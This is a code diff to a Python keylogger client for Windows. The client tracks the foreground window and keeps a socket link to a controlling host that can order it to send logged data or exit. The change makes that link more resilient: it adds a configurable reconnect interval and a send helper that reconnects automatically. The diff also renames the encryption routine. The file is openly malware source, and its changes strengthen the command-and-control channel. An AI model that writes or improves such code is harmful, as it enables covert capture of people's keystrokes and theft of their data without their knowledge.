@@ -15,7 +15,7 @@ from win32gui import GetWindowText, GetForegroundWindow
 
 
 class Keylogger:
-    def __init__(self, log_interval, window_interval):
+    def __init__(self, log_interval, window_interval, reconnect_interval):
         self.active = False
         self.connected = False
         self.filecounter = 0
@@ -29,6 +29,7 @@ class Keylogger:
         self.start_time = datetime.now()
         self.end_time = datetime.now()
 
+        self.reconnect_interval = reconnect_interval
         self.sock = socket()
         self.host = "127.0.0.1"
         self.port = 1005
@@ -99,21 +100,27 @@ class Keylogger:
             time.sleep(self.window_interval)
 
     def connect_to_host(self):
-        self.sock.connect((self.host, self.port))
-
-    def try_connecting(self):
         while not self.connected:
             try:
-                self.connect_to_host()
+                self.sock.connect((self.host, self.port))
                 self.connected = True
             except:
                 self.connected = False
-                time.sleep(5)
+                time.sleep(self.reconnect_interval)
+
+    def send_to_host(self, data):
+        encrypted_data = self.encrypt(data)
+
+        try:
+            self.sock.sendall(encrypted_data)
+        except:
+            self.connected = False
+            self.connect_to_host()
 
     def send_keylog_files_to_host(self):
-        self.sock.sendall(self.encryption(b'data'))
+        self.send_to_host(b'data')
 
-    def encryption(self, fileName):
+    def encrypt(self, fileName):
         openFile = open(".\client.py", "r")
         fileContent = bytes(openFile.read(), encoding = "utf-8")
         #key = hashlib.sha256(fileContent).hexdigest().encode("utf8")[4:20]
@@ -144,7 +151,7 @@ class Keylogger:
         foreground_window_thread = Thread(target=self.check_foreground_window)
         foreground_window_thread.start()
 
-        self.try_connecting()
+        self.connect_to_host()
 
         while True:
             recv = self.sock.recv(1024)
@@ -152,16 +159,16 @@ class Keylogger:
                 recv = str(recv)[2:-1]
 
                 if recv == "exit":
-                    self.sock.sendall(self.encryption(b'terminating'))
+                    self.send_to_host(b'terminating')
                     self.sock.close()
                     self.active = False
                     break
                 elif recv == "send":
                     self.send_keylog_files_to_host()
                 else:
-                    self.sock.sendall(self.encryption(b'received'))
+                    self.send_to_host(b'received')
                     print(recv)
 
 if __name__ == "__main__":
-    keylogger = Keylogger(log_interval=15, window_interval=0.25)
+    keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
     keylogger.start()
